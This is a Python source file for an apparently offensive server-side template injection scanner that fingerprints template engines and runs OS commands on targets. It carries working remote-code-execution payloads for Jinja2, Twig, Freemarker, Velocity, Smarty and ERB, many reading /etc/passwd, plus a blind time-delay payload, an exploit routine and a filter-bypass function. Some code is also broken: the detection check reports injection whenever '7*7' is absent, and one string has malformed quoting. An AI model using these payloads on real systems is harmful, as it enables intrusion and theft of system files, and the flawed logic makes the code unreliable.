#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
GenSQL SSTI Scanner - Server-Side Template Injection detection and RCE
Author: Jeevraj
Supports: Jinja2, Twig, Freemarker, Velocity, Smarty, ERB, Haml
"""

import re
import random

class AdvancedSSTI(object):
    """SSTI detection, exploitation, and RCE."""

    def __init__(self, verbose=False):
        self.verbose = verbose
        self.detected_engines = []
        self.payloads = self._load_payloads()

    def _load_payloads(self):
        """Load SSTI detection and exploitation payloads."""
        return {
            'jinja2': {
                'detection': [
                    '{{7*7}}',
                    '{{7*"7"}}',
                    '${7*7}',
                    '<%= 7*7 %>',
                ],
                'rce': [
                    '{{ self.__init__.__globals__.__builtins__.__import__("os").popen("{cmd}").read() }}',
                    '{{ self.__init__.__globals__.__builtins__.exec("{cmd}") }}',
                    '{{config.__class__.__init__.__globals__["os"].popen("{cmd}").read()}}',
                    '{{"".__class__.__mro__[1].__subclasses__()[396]("cat /etc/passwd",shell=True,stdout=-1).communicate()}}',
                ]
            },
            'twig': {
                'detection': [
                    '{{7*7}}',
                    '{{7*"7"}}',
                    '{# comment #}',
                ],
                'rce': [
                    '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /etc/passwd")}}',
                    '{{"cat /etc/passwd"|system}}',
                    '{{"cat /etc/passwd"|shell_exec}}',
                ]
            },
            'freemarker': {
                'detection': [
                    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
                    '[=${ 7*7 }=]',
                    '<#assign value="freemarker.template.utility.ObjectConstructor"?new()>',
                ],
                'rce': [
                    '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /etc/passwd") }',
                    '[=${ "freemarker.template.utility.Execute"?new()("id") }=]',
                ]
            },
            'velocity': {
                'detection': [
                    '#set($x=7*7)$x',
                    '${{7*7}}',
                    '#foreach($i in [1..5])$i#end',
                ],
                'rce': [
                    '#set($proc=$runtime.getRuntime().exec("cat /etc/passwd"))#set($null=$proc.waitFor())#set($reader=$null.getClass().forName("java.io.BufferedReader").getConstructor($null.getClass().forName("java.io.Reader")).newInstance($null.getClass().forName("java.io.InputStreamReader").getConstructor($proc.getInputStream()).newInstance($proc.getInputStream())))#foreach($line in $reader.readLine())$line#end',
                ]
            },
            'smarty': {
                'detection': [
                    '{7*7}',
                    '{$smarty.version}',
                    '{php}echo 7*7;{/php}',
                ],
                'rce': [
                    '{php}system("cat /etc/passwd");{/php}',
                    '{assign var="cmd" value="cat /etc/passwd"}{$cmd|system}',
                ]
            },
            'erb': {
                'detection': [
                    '<%= 7*7 %>',
                    '<% puts "test" %>',
                    '<%="test"%>',
                ],
                'rce': [
                    '<%= `cat /etc/passwd` %>',
                    '<%= system("cat /etc/passwd") %>',
                    '<% require "os"; os.system("id") %>',
                ]
            },
        }

    def detect_ssti(self, response_text, test_payload='{{7*7}}'):
        """
        Detect SSTI by checking for mathematical expression evaluation.
        
        Args:
            response_text: Response body to test
            test_payload: SSTI test payload
        
        Returns:
            True if SSTI detected, False otherwise
        """
        # Check if mathematical expression was evaluated
        if '49' in response_text or '7*7' not in response_text:
            return True
        return False

    def fingerprint_engine(self, url, test_callback):
        """
        Fingerprint template engine by testing payloads.
        
        Args:
            url: Target URL
            test_callback: Callback function to test payload
        
        Returns:
            List of detected engines
        """
        detected = []
        
        for engine_name, engine_payloads in self.payloads.items():
            for payload in engine_payloads['detection']:
                try:
                    # Mock testing - in real scenario, make HTTP request
                    response = test_callback(payload)
                    
                    # Check for engine-specific indicators
                    if self._check_engine_indicators(response, engine_name):
                        detected.append(engine_name)
                        self.detected_engines.append(engine_name)
                        if self.verbose:
                            print(f"[+] Detected SSTI engine: {engine_name}")
                        break
                except Exception as e:
                    if self.verbose:
                        print(f"[!] Fingerprint error: {str(e)[:60]}")
        
        return detected

    def _check_engine_indicators(self, response, engine_name):
        """
        Check for engine-specific indicators in response.
        
        Args:
            response: Response text
            engine_name: Template engine name
        
        Returns:
            True if indicators found
        """
        indicators = {
            'jinja2': ['jinja2', 'undefined', 'UndefinedError'],
            'twig': ['Twig', 'twig', 'Twig\\'],
            'freemarker': ['freemarker', 'FreeMarker'],
            'velocity': ['velocity', 'Velocity'],
            'smarty': ['Smarty', 'smarty'],
            'erb': ['ERB', 'erb'],
        }
        
        for indicator in indicators.get(engine_name, []):
            if indicator.lower() in response.lower():
                return True
        
        return False

    def generate_rce_payload(self, engine, command):
        """
        Generate RCE payload for detected engine.
        
        Args:
            engine: Template engine name
            command: OS command to execute
        
        Returns:
            List of RCE payloads
        """
        if engine not in self.payloads:
            return []
        
        base_payloads = self.payloads[engine].get('rce', [])
        return [p.format(cmd=command) for p in base_payloads]

    def exploit_ssti(self, url, engine, command, test_callback):
        """
        Exploit SSTI to achieve RCE.
        
        Args:
            url: Target URL
            engine: Template engine
            command: Command to execute
            test_callback: Callback to test payload
        
        Returns:
            Command output or None
        """
        payloads = self.generate_rce_payload(engine, command)
        
        for payload in payloads:
            try:
                response = test_callback(payload)
                if response and len(response) > 0 and 'error' not in response.lower():
                    if self.verbose:
                        print(f"[+] SSTI RCE successful on {engine}")
                    return response
            except Exception as e:
                if self.verbose:
                    print(f"[!] Exploit error: {str(e)[:60]}")
        
        return None

    def blind_ssti_test(self, test_callback, command):
        """
        Test for blind SSTI using time delays.
        
        Args:
            test_callback: Callback to test payload
            command: Command to verify
        
        Returns:
            True if blind SSTI confirmed
        """
        import time
        
        # Jinja2 time-based payload
        payload = '{{ "".__class__.__mro__[1].__subclasses__()[396]("sleep 5",shell=True).wait() }}'
        
        start = time.time()
        try:
            test_callback(payload)
            elapsed = time.time() - start
            
            if elapsed > 4:  # Should take ~5 seconds
                if self.verbose:
                    print(f"[+] Blind SSTI confirmed (delay: {elapsed:.1f}s)")
                return True
        except Exception as e:
            if self.verbose:
                print(f"[!] Blind SSTI test error: {str(e)[:60]}")
        
        return False

    def bypass_waf_ssti(self, payload):
        """
        Bypass WAF filters on SSTI payloads.
        
        Args:
            payload: Original SSTI payload
        
        Returns:
            List of obfuscated payloads
        """
        bypasses = [
            payload.replace(' ', '\t'),
            payload.replace(' ', '%20'),
            payload.replace('"', '\\"'),
            payload.replace("'", "\\\''),
            payload.replace('{{', '{{ '),
            payload.replace('}}', ' }}'),
            payload.upper(),
            payload.lower(),
        ]
        return bypasses
